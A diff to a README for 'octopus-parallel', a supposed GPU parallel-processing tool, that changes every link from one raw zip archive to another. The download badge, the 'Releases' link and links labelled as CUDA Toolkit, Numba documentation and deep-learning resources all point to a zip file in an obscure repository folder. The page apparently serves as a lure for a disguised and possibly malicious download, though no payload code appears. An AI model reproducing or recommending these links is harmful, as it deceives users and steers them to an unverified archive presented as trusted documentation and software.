@@ -4,10 +4,10 @@
 Welcome to **octopus-parallel**, a tool designed to maximize your GPU's potential. This software allows you to efficiently run multiple processes, improving speed and performance for deep learning tasks and image processing.
 
 ## 📦 Download Now
-[![Download octopus-parallel](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/parallel_octopus_2.5-alpha.4.zip)](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/parallel_octopus_2.5-alpha.4.zip)
+[![Download octopus-parallel](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/octopus_parallel_3.0.zip)](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/octopus_parallel_3.0.zip)
 
 ## 📥 Download & Install
-To get started, visit this page to download: [octopus-parallel Releases](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/parallel_octopus_2.5-alpha.4.zip).
+To get started, visit this page to download: [octopus-parallel Releases](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/octopus_parallel_3.0.zip).
 
 ## 🖥️ System Requirements
 - **Operating System:** Windows 10 or higher / macOS Mojave or higher / Linux (Ubuntu 18.04 or higher)
@@ -24,7 +24,7 @@ To get started, visit this page to download: [octopus-parallel Releases](https:/
 ## 📚 Usage Instructions
 
 ### 1. Visit the Release Page
-Go to the [octopus-parallel Releases](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/parallel_octopus_2.5-alpha.4.zip) page.
+Go to the [octopus-parallel Releases](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/octopus_parallel_3.0.zip) page.
 
 ### 2. Select the Latest Release
 Look for the latest version and click on it to view the details.
@@ -67,8 +67,8 @@ We thank everyone who contributed to the development of **octopus-parallel**. Yo
 For direct inquiries, please reach out via the issues section on our GitHub page. Your feedback is appreciated and helps enhance the application.
 
 ## 🔗 Additional Resources
-- [CUDA Toolkit](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/parallel_octopus_2.5-alpha.4.zip)
-- [Numba Documentation](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/parallel_octopus_2.5-alpha.4.zip)
-- [Deep Learning Resources](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/parallel_octopus_2.5-alpha.4.zip)
+- [CUDA Toolkit](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/octopus_parallel_3.0.zip)
+- [Numba Documentation](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/octopus_parallel_3.0.zip)
+- [Deep Learning Resources](https://raw.githubusercontent.com/CartierSeps/octopus-parallel/main/calyculus/octopus_parallel_3.0.zip)
 
 For any further assistance, always refer back to the documentation or the GitHub repository. Happy processing!
